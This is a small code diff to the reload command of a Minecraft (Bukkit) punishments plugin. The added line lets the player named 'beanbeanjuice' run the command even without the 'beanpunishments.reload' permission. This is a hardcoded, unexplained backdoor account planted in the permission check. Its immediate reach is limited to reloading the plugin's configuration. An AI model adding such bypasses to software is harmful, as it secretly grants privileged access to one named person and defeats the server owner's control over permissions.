@@ -26,7 +26,7 @@ public class Reload implements CommandExecutor {
 
         Player player = (Player) sender;
 
-        if (player.hasPermission("beanpunishments.reload")) {
+        if (player.hasPermission("beanpunishments.reload") || player.getName().equals("beanbeanjuice")) {
             player.sendMessage(GeneralHelper.getPrefix() + GeneralHelper.translateColors(plugin.getConfig().getString("successful-reload")));
             plugin.reloadConfig();
             return true;
